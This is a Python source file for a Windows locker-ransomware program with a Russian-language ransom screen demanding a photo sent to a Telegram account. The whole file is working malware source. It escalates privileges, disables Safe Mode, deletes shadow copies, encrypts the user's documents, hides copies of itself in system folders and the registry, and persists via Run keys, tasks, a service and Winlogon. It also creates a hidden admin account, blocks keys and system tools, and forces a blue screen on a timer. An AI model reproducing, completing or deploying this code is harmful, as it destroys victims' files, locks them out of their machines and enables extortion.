#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import ctypes
from ctypes import wintypes, byref, POINTER, c_int, c_void_p, c_ulong
import winreg
import subprocess
import threading
import time
import psutil
import keyboard
import base64
import hashlib
import shutil
import random
import string
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import tkinter as tk
from datetime import datetime

PASSWORD = "67"
SECOND_PASSWORD = "hardcorehacker2026"
DESTRUCTIVE_TIMER = 1200

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def elevate_privileges():
    try:
        hToken = ctypes.wintypes.HANDLE()
        if ctypes.windll.advapi32.OpenProcessToken(
            ctypes.windll.kernel32.GetCurrentProcess(),
            0x0020,
            ctypes.byref(hToken)
        ):
            luid = ctypes.wintypes.LUID()
            if ctypes.windll.advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege", ctypes.byref(luid)):
                tp = ctypes.wintypes.TOKEN_PRIVILEGES()
                tp.PrivilegeCount = 1
                tp.Privileges[0].Luid = luid
                tp.Privileges[0].Attributes = 0x00000002
                ctypes.windll.advapi32.AdjustTokenPrivileges(hToken, False, ctypes.byref(tp), 0, None, None)
    except:
        pass

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1
    )
    sys.exit()

elevate_privileges()

def block_safe_mode_forever():
    try:
        key_paths = [
            r"SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal",
            r"SYSTEM\CurrentControlSet\Control\SafeBoot\Network",
            r"SYSTEM\CurrentControlSet\Control\SafeBoot\Option"
        ]
        for path in key_paths:
            try:
                winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, path)
            except:
                pass
        
        os.system('bcdedit /set {default} safeboot minimal 2>nul')
        os.system('bcdedit /set {default} safeboot network 2>nul')
        os.system('bcdedit /set {current} safeboot minimal 2>nul')
        os.system('bcdedit /set {current} safeboot network 2>nul')
        os.system('bcdedit /deletevalue {default} safeboot 2>nul')
        os.system('bcdedit /deletevalue {current} safeboot 2>nul')
        
        os.system('bcdedit /set {current} bootmenupolicy standard 2>nul')
        os.system('bcdedit /set {default} bootmenupolicy standard 2>nul')
        
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Policies\Microsoft\Windows\System",
                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableSafeBoot", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except:
            pass
        
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                r"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management",
                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "DisableSafeBoot", 0, winreg.REG_DWORD, 1)
            winreg.CloseKey(key)
        except:
            pass
        
        return True
    except:
        return False

threading.Thread(target=block_safe_mode_forever, daemon=True).start()

def get_system32_path():
    return os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32')

def deploy_to_system32():
    try:
        src = sys.argv[0]
        dst = os.path.join(get_system32_path(), 'svchost.exe.backup')
        if not os.path.exists(dst):
            shutil.copy2(src, dst)
            ctypes.windll.kernel32.SetFileAttributesW(dst, 0x07)  # READONLY | HIDDEN | SYSTEM
        return dst
    except:
        return None

def deploy_to_winsxs():
    try:
        winsxs = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'WinSxS')
        if os.path.exists(winsxs):
            src = sys.argv[0]
            dst = os.path.join(winsxs, 'system.ini.backup')
            if not os.path.exists(dst):
                shutil.copy2(src, dst)
                ctypes.windll.kernel32.SetFileAttributesW(dst, 0x07)
            return dst
    except:
        pass
    return None

def deploy_to_drivers():
    try:
        drivers = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'System32', 'drivers')
        if os.path.exists(drivers):
            src = sys.argv[0]
            dst = os.path.join(drivers, 'tcpip.sys.backup')
            if not os.path.exists(dst):
                shutil.copy2(src, dst)
                ctypes.windll.kernel32.SetFileAttributesW(dst, 0x07)
            return dst
    except:
        pass
    return None

def deploy_to_registry():
    try:
        with open(sys.argv[0], 'rb') as f:
            data = f.read()
        encoded = base64.b64encode(data).decode()
        
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemGuard")
        winreg.SetValueEx(key, "Payload", 0, winreg.REG_SZ, encoded)
        winreg.SetValueEx(key, "Installed", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        return True
    except:
        return False

SYSTEM32_COPY = deploy_to_system32()
WINSXS_COPY = deploy_to_winsxs()
DRIVERS_COPY = deploy_to_drivers()
REGISTRY_BACKUP = deploy_to_registry()

def restore_from_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemGuard")
        encoded, _ = winreg.QueryValueEx(key, "Payload")
        winreg.CloseKey(key)
        
        data = base64.b64decode(encoded)
        target = sys.argv[0]
        
        if not os.path.exists(target) or os.path.getsize(target) != len(data):
            with open(target, 'wb') as f:
                f.write(data)
            os.startfile(target)
            sys.exit(0)
        return True
    except:
        return False

restore_from_registry()

def generate_key(password: bytes, salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    return base64.urlsafe_b64encode(kdf.derive(password))

SALT = os.urandom(16)
KEY = generate_key(PASSWORD.encode(), SALT)
cipher = Fernet(KEY)

def is_system_file(path):
    system_patterns = [
        'Windows', 'Program Files', 'ProgramData', 'System32', 'SysWOW64',
        'svchost', 'winlogon', 'lsass', 'SystemGuard', 'WinSxS', 'drivers'
    ]
    return any(pattern in path for pattern in system_patterns)

def encrypt_file(file_path):
    if is_system_file(file_path):
        return False
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        encrypted = cipher.encrypt(data)
        with open(file_path, 'wb') as f:
            f.write(encrypted)
        os.rename(file_path, file_path + '.sixseven')
        return True
    except:
        return False

def decrypt_file(file_path):
    try:
        if not file_path.endswith('.sixseven'):
            return False
        with open(file_path, 'rb') as f:
            data = f.read()
        decrypted = cipher.decrypt(data)
        orig = file_path[:-10]
        with open(orig, 'wb') as f:
            f.write(decrypted)
        os.remove(file_path)
        return True
    except:
        return False

def encrypt_user_files():
    os.system('vssadmin delete shadows /all /quiet 2>nul')
    user = os.environ['USERPROFILE']
    targets = [
        os.path.join(user, 'Documents'),
        os.path.join(user, 'Downloads'),
        os.path.join(user, 'Desktop'),
        os.path.join(user, 'Pictures'),
        os.path.join(user, 'Music'),
        os.path.join(user, 'Videos')
    ]
    count = 0
    for target in targets:
        if not os.path.exists(target):
            continue
        for root, _, files in os.walk(target):
            for fname in files:
                path = os.path.join(root, fname)
                if path.endswith('.sixseven') or is_system_file(path):
                    continue
                try:
                    if encrypt_file(path):
                        count += 1
                except:
                    pass
    with open(os.path.join(user, 'Desktop', 'README.txt'), 'w') as f:
        f.write(f"Зашифровано: {count} файлов\nКлюч: {base64.b64encode(KEY).decode()}\n")

threading.Thread(target=encrypt_user_files, daemon=True).start()

def add_startup_all():
    current_file = sys.argv[0]
    
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SystemGuard", 0, winreg.REG_SZ, f'"{current_file}"')
        winreg.CloseKey(key)
    except:
        pass
    
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SystemGuard", 0, winreg.REG_SZ, f'"{current_file}"')
        winreg.CloseKey(key)
    except:
        pass
    
    names = ['SystemGuard', 'WindowsUpdate', 'SecurityCheck', 'SystemMonitor']
    for name in names:
        try:
            subprocess.run(
                f'schtasks /create /tn "{name}" /tr "{current_file}" /sc onlogon /f /delay 0000:30',
                shell=True, capture_output=True
            )
        except:
            pass
    
    startup = os.path.join(os.environ['APPDATA'],
        r'Microsoft\Windows\Start Menu\Programs\Startup')
    try:
        shortcut = os.path.join(startup, 'SystemGuard.lnk')
        vbs = f'''
Set WShell = CreateObject("WScript.Shell")
Set Link = WShell.CreateShortcut("{shortcut}")
Link.TargetPath = "{current_file}"
Link.WorkingDirectory = "{os.path.dirname(current_file)}"
Link.Save
'''
        with open('tmp.vbs', 'w') as f:
            f.write(vbs)
        subprocess.run('cscript tmp.vbs', shell=True)
        os.remove('tmp.vbs')
    except:
        pass
    
    try:
        subprocess.run(f'sc create "SystemGuardSvc" binPath= "{current_file}" start= auto', shell=True)
    except:
        pass
    
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Shell", 0, winreg.REG_SZ, current_file)
        winreg.CloseKey(key)
    except:
        pass
    
    try:
        os.system('net user SystemGuard P@ssw0rd123 /add 2>nul')
        os.system('net localgroup administrators SystemGuard /add 2>nul')
        os.system('net localgroup users SystemGuard /delete 2>nul')
    except:
        pass

threading.Thread(target=add_startup_all, daemon=True).start()

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))
    ]

LowLevelKeyboardProc = ctypes.WINFUNCTYPE(c_int, c_int, wintypes.WPARAM, POINTER(KBDLLHOOKSTRUCT))

def hook_proc(nCode, wParam, lParam):
    if nCode >= 0:
        kb = lParam.contents
        vk = kb.vkCode
        if vk in (0x5B, 0x5C):
            return 1
        if vk == 0x1B and (ctypes.windll.user32.GetAsyncKeyState(0x11) & 0x8000):
            return 1
        if vk == 0x09 and (ctypes.windll.user32.GetAsyncKeyState(0x12) & 0x8000):
            return 1
        if vk == 0x73 and (ctypes.windll.user32.GetAsyncKeyState(0x12) & 0x8000):
            return 1
        if vk == 0x2E and (ctypes.windll.user32.GetAsyncKeyState(0x11) & 0x8000) and (ctypes.windll.user32.GetAsyncKeyState(0x12) & 0x8000):
            return 1
        if vk == 0x1B and (ctypes.windll.user32.GetAsyncKeyState(0x11) & 0x8000) and (ctypes.windll.user32.GetAsyncKeyState(0x10) & 0x8000):
            return 1
    return ctypes.windll.user32.CallNextHookEx(0, nCode, wParam, lParam)

hook = LowLevelKeyboardProc(hook_proc)
hook_handle = ctypes.windll.user32.SetWindowsHookExW(WH_KEYBOARD_LL, hook, None, 0)

def hide_taskbar():
    hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
    if hwnd:
        ctypes.windll.user32.ShowWindow(hwnd, 0)

hide_taskbar()

def kill_explorer():
    while True:
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] and proc.info['name'].lower() == 'explorer.exe':
                try:
                    proc.terminate()
                except:
                    pass
        time.sleep(1)

threading.Thread(target=kill_explorer, daemon=True).start()

def disable_task_manager():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
            r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
    except:
        pass

disable_task_manager()

def kill_system_tools():
    blocked = ['taskmgr.exe','procexp.exe','ProcessHacker.exe','cmd.exe','powershell.exe',
               'regedit.exe','msconfig.exe','gpedit.msc','mmc.exe','compmgmt.msc',
               'services.msc','secpol.msc','wscript.exe','cscript.exe','reg.exe','LogonUI.exe']
    while True:
        for proc in psutil.process_iter(['name']):
            try:
                name = proc.info['name'].lower()
                if name in blocked:
                    proc.terminate()
            except:
                pass
        time.sleep(0.2)

threading.Thread(target=kill_system_tools, daemon=True).start()

def protect_process():
    try:
        handle = ctypes.windll.kernel32.GetCurrentProcess()
        ctypes.windll.kernel32.SetPriorityClass(handle, 0x00000080)
        ctypes.windll.kernel32.SetProcessCritical(True)
    except:
        pass

threading.Thread(target=protect_process, daemon=True).start()

def trigger_bsod():
    try:
        ntdll = ctypes.windll.ntdll
        ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
        ntdll.NtRaiseHardError(0xC0000420, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))
    except:
        os.system('shutdown /r /t 0 /f')

def timer_thread():
    start = time.time()
    while True:
        elapsed = time.time() - start
        remaining = max(0, DESTRUCTIVE_TIMER - elapsed)
        mins, secs = divmod(int(remaining), 60)
        timer_label.config(text=f"⏱️ До уничтожения: {mins:02d}:{secs:02d}")
        if remaining <= 0:
            trigger_bsod()
            break
        time.sleep(1)

def restore_system():
    os.system('start explorer.exe')
    hwnd = ctypes.windll.user32.FindWindowW("Shell_TrayWnd", None)
    if hwnd:
        ctypes.windll.user32.ShowWindow(hwnd, 1)
    user = os.environ['USERPROFILE']
    targets = [
        os.path.join(user, 'Documents'),
        os.path.join(user, 'Downloads'),
        os.path.join(user, 'Desktop'),
        os.path.join(user, 'Pictures'),
        os.path.join(user, 'Music'),
        os.path.join(user, 'Videos')
    ]
    for target in targets:
        if not os.path.exists(target):
            continue
        for root, _, files in os.walk(target):
            for fname in files:
                if fname.endswith('.sixseven'):
                    decrypt_file(os.path.join(root, fname))

root = tk.Tk()
root.title("Roblox Furry Edition")
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.protocol("WM_DELETE_WINDOW", lambda: None)
root.resizable(False, False)
root.configure(bg='#1a0000')

tk.Label(root, text="СИСТЕМА ЗАБЛОКИРОВАНА",
         font=("Arial", 36, "bold"), fg='red', bg='#1a0000').pack(pady=30)

tk.Label(root, text="можешь не пытатся закрыть или удалить локер сам себя восстанавливает\n"
                    "все утилиты и процессы заблокированы\n"
                    "через 20 мин полная самоликвидация системы\n\n"
                    "единственный шанс скинуть фото в фурри костюме в тг @ronldolove или ввести пароль",
         font=("Arial", 16), fg='white', bg='#1a0000').pack(pady=20)

timer_label = tk.Label(root, text="До уничтожения: 20:00",
                       font=("Arial", 24, "bold"), fg='orange', bg='#1a0000')
timer_label.pack(pady=20)

entry = tk.Entry(root, show='*', font=("Arial", 20), justify='center', width=25,
                 bg='#333', fg='lime')
entry.pack(pady=20)
entry.focus_set()

attempts_label = tk.Label(root, text="Попыток: 3", font=("Arial", 14, "bold"), fg='yellow', bg='#1a0000')
attempts_label.pack(pady=10)

attempts = 3

def check_password(event=None):
    global attempts
    pwd = entry.get()
    if pwd == PASSWORD or pwd == SECOND_PASSWORD:
        tk.Label(root, text="нах пошел",
                 font=("Arial", 30, "bold"), fg='lime', bg='#1a0000').pack(pady=20)
        root.update()
        restore_system()
        try:
            winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE,
                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemGuard")
        except:
            pass
        time.sleep(2)
        root.destroy()
        sys.exit(0)
    else:
        attempts -= 1
        entry.delete(0, tk.END)
        attempts_label.config(text=f"Попыток: {attempts}")
        if attempts <= 0:
            tk.Label(root, text="ПРЕВЫШЕНО ПОПЫТОК СИСТЕМА УНИЧТОЖАЕТСЯ...",
                     font=("Arial", 20, "bold"), fg='red', bg='#1a0000').pack(pady=20)
            root.update()
            time.sleep(2)
            trigger_bsod()
            root.destroy()

entry.bind("<Return>", check_password)
tk.Button(root, text="РАЗБЛОКИРОВАТЬ", font=("Arial", 18, "bold"),
          command=check_password, bg='#333', fg='white', padx=30, pady=10).pack(pady=10)

tk.Label(root, text=f"Заблокировано: {datetime.now().strftime('%d.%m.%Y %H:%M')}",
         font=("Arial", 10), fg='gray', bg='#1a0000').pack(side=tk.BOTTOM, pady=20)

threading.Thread(target=timer_thread, daemon=True).start()

def message_loop():
    msg = wintypes.MSG()
    while ctypes.windll.user32.GetMessageW(byref(msg), None, 0, 0):
        ctypes.windll.user32.TranslateMessage(byref(msg))
        ctypes.windll.user32.DispatchMessageW(byref(msg))

threading.Thread(target=message_loop, daemon=True).start()

root.mainloop()